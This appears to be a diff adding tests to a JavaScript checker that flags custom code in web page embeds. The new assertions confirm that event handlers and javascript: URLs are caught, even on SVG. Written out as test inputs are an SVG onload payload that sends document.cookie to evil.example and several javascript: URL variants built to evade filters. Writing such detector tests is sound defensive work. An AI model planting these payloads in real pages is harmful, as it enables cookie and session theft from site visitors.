@@ -98,6 +98,14 @@ for (const src of [
   assert.deepEqual(sources(embed('gsap w-embed', `<script src="${src}"></script>`)), [], `GSAP source allowed: ${src}`);
 }
 
+// Inline event handlers and javascript: URLs are custom code, even on permitted SVG (Codex P2).
+assert.deepEqual(sources(embed('onload w-embed', `<svg onload="fetch('https://evil.example/?c='+document.cookie)"></svg>`)), ['.onload: <svg[onload]>']);
+assert.deepEqual(sources(embed('deep w-embed', '<span><svg><path onclick="steal()" d="M0"/></svg></span>')), ['.deep: <path[onclick]>']);
+assert.deepEqual(sources(embed('jsurl w-embed', '<svg><a href=" javascript:steal()"><text>x</text></a></svg>')), ['.jsurl: <a[href]>']);
+assert.deepEqual(sources(embed('xlink w-embed', '<svg><a xlink:href="JaVaScRiPt:steal()"><text>x</text></a></svg>')), ['.xlink: <a[xlink:href]>']);
+assert.deepEqual(sources(embed('animate w-embed', '<svg><a><animate attributeName="href" to="javascript:steal()"/><text>x</text></a></svg>')), ['.animate: <animate[to]>']);
+assert.deepEqual(sources(embed('plain w-embed', '<svg><a href="https://example.com"><path d="M0"/></a></svg>')), [], 'ordinary SVG links stay allowed');
+
 // Attribute names are exact (Codex P2).
 assert.deepEqual(sources('<div data-class="w-embed"><video></video></div>'), []);
 assert.deepEqual(sources(embed('vid w-embed', '<iframe data-src="https://www.youtube.com/embed/x" src="https://evil.example/frame"></iframe>')), ['.vid: <iframe>']);
